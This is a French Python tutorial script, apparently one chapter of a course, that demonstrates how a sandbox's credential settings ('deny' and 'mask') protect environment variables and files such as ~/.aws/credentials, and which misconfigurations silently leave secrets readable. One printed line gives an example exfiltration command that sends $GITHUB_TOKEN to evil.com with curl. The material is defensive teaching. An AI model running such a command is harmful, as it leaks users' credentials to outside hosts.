"""Chapitre 5 — Protéger et masquer les identifiants.

    uv run python chapitres/chapitre_5_identifiants.py

Le chapitre 2 l'a montré : par défaut, une commande sandboxée lit **tout**
l'ordinateur, `~/.aws/credentials` compris. Isoler les fichiers ne protège
donc pas les secrets — c'est ce bloc-ci qui le fait, et il a ses propres
règles.

`deny` marche seul. `mask` demande TROIS conditions, et chacune échoue
silencieusement.
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from outils.commun import config, ligne, titre, utf8       # noqa: E402
from outils.resolveur import (Config, identifiants,        # noqa: E402
                              peut_lire)


def tableau(config_, entete: str) -> None:
    print(f"   {entete}")
    for ident in identifiants(config_):
        print(f"      {ident.nom:<24}{ident.mode:<16}voit : {ident.visible}")
        if ident.remarque:
            for morceau in ident.remarque.split(" ; "):
                print(f"      {'':<40}⚠️  {morceau}")


def main() -> None:
    utf8()

    titre(1, "deny : LA VARIABLE DISPARAIT")
    print("   « environment variables are unset before each sandboxed command")
    print("     runs. »\n")
    tableau(config("depot"), "configs/depot.json")
    print()
    print("   C'est net, et c'est le but : « npm publish » echouera faute de")
    print("   NPM_TOKEN, et cet echec est le comportement voulu. Un secret")
    print("   qu'une commande ne voit pas ne peut pas fuir par cette commande.")
    print("   Le prix est que l'outil casse — donc on ne peut pas tout denier.")

    titre(2, "mask : LA COMMANDE VOIT UNE SENTINELLE, LE SERVEUR LA VRAIE VALEUR")
    print("   Le proxy tourne HORS du bac a sable. Il termine TLS, reconnait")
    print("   la sentinelle dans la requete sortante, et la remplace par le")
    print("   vrai secret — mais seulement vers les hotes de injectHosts.\n")
    tableau(config("utilisateur", "utilisateur"), "configs/utilisateur.json")
    print()
    print("   « git push » marche, « cat $GITHUB_TOKEN » ne montre rien, et")
    print("   « curl -H \"Authorization: $GITHUB_TOKEN\" evil.com » part avec")
    print("   la sentinelle. C'est la seule facon d'avoir les deux.")

    titre(3, "LES TROIS CONDITIONS D'UN MASQUE, CHACUNE SILENCIEUSE")
    base = {"name": "GITHUB_TOKEN", "mode": "mask",
            "injectHosts": ["api.github.com"]}
    cas = [
        ("tout est en place",
         Config(enabled=True, portee="utilisateur",
                network={"allowedDomains": ["api.github.com"],
                         "tlsTerminate": True},
                credentials={"envVars": [base]})),
        ("sans network.tlsTerminate",
         Config(enabled=True, portee="utilisateur",
                network={"allowedDomains": ["api.github.com"]},
                credentials={"envVars": [base]})),
        ("injectHosts hors de allowedDomains",
         Config(enabled=True, portee="utilisateur",
                network={"allowedDomains": ["pypi.org"], "tlsTerminate": True},
                credentials={"envVars": [base]})),
        ("le tout ecrit dans le depot",
         Config(enabled=True, portee="projet",
                network={"allowedDomains": ["api.github.com"],
                         "tlsTerminate": True},
                credentials={"envVars": [base]})),
    ]
    for etiquette, c in cas:
        (ident,) = identifiants(c)
        print(f"   {etiquette}")
        print(f"      la commande voit : {ident.visible}")
        for morceau in filter(None, ident.remarque.split(" ; ")):
            print(f"      ⚠️  {morceau}")
        print()

    titre(4, "LE PIRE DES TROIS ECHECS")
    print("   Les deux echecs du milieu CASSENT l'authentification : penible,")
    print("   visible, corrige dans l'heure. Le dernier ne casse rien — il")
    print("   rend simplement le secret lisible.\n")
    for etiquette, c in cas:
        (ident,) = identifiants(c)
        casse = "l'outil casse" if "ECHOUE" in ident.remarque \
            or "jamais injectee" in ident.remarque else "tout marche"
        ligne(etiquette, f"{ident.visible:<18}{casse}", 36)
    print()
    print("   Un « mask » ecrit dans le .claude/settings.json d'un depot n'est")
    print("   ni applique NI refuse : l'entree est jetee. La variable garde sa")
    print("   valeur, les commandes la lisent en entier, et la configuration")
    print("   qu'on relit dit « mask ». C'est le seul des quatre cas ou l'on")
    print("   croit etre protege ET ou rien ne dysfonctionne.")

    titre(5, "LES FICHIERS : DEUX MODES, DEUX COUCHES DIFFERENTES")
    print("   « credentials.files deny read blocks — Not enforced [avec")
    print("     filesystem.disabled]. The filesystem layer applies both. »")
    print("   « credentials.files mask entries applied as masks — Enforced:")
    print("     masking is independent of the filesystem layer. »\n")
    for coupee in (False, True):
        fs = {"disabled": True} if coupee else {}
        c = Config(enabled=True, portee="utilisateur", filesystem=fs,
                   network={"allowedDomains": ["api.github.com"],
                            "tlsTerminate": True},
                   credentials={"files": [
                       {"path": "~/.aws/credentials", "mode": "deny"},
                       {"path": "~/.config/gh/hosts.yml", "mode": "mask",
                        "injectHosts": ["api.github.com"]}]})
        print(f"   filesystem.disabled = {str(coupee).lower()}")
        for chemin in ("~/.aws/credentials", "~/.config/gh/hosts.yml"):
            v = peut_lire(c, chemin)
            print(f"      {chemin:<28}"
                  f"{'lit  ' if v.autorise else 'REFUS'}   {v.raison}")
        print()
    print("   Couper l'isolation des fichiers emporte le « deny » et laisse le")
    print("   « mask ». Ce n'est pas une exception : un deny est un blocage de")
    print("   LECTURE, donc la couche fichiers ; un mask remplace un CONTENU,")
    print("   donc le proxy. Savoir a quelle couche appartient une protection")
    print("   dit exactement ce qui reste quand on coupe l'autre.")

    print("\n   Au chapitre suivant : les trois couches ensemble, et ce que")
    print("   ce projet ne peut pas montrer.\n")


if __name__ == "__main__":
    main()
